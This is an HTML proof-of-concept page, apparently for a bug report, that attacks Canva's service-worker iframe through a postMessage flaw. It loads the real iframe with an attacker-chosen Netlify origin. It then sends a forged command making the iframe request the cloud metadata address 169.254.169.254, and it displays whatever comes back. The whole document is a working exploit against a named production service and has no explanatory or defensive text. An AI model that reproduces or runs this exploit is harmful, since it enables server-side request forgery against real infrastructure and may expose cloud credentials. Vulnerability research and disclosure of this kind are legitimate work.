<!DOCTYPE html>
<html>
<head>
  <title>postMessage Hijack PoC</title>
</head>
<body>
  <h2>Canva Service Worker postMessage Hijack PoC</h2>

  <!-- Embed vulnerable Canva iframe with attacker-controlled origin -->
  <iframe id="targetFrame"
    src="https://ct.canva.com/_/service_worker/5510/sw_iframe.html?origin=https://heroic-pastelito-45712a.netlify.app"
    style="width:100%; height:300px; border:1px solid black;"></iframe>

  <script>
    setTimeout(() => {
      const iframe = document.getElementById("targetFrame");

      const message = {
        clientId: "evilClient",
        type: 1, // Command
        command: {
          commandType: 0, // GET
          params: {
            url: "http://169.254.169.254/latest/meta-data/", // SSRF target
            method: 0,
            processResponse: true
          }
        }
      };

      // ✅ Canva's iframe should trust this
      iframe.contentWindow.postMessage(message, "https://ct.canva.com");
    }, 3000);

    window.addEventListener("message", (event) => {
      if (event.origin === "https://ct.canva.com") {
        alert("✅ Response:\n" + JSON.stringify(event.data, null, 2));
      }
    });
  </script>
</body>
</html>
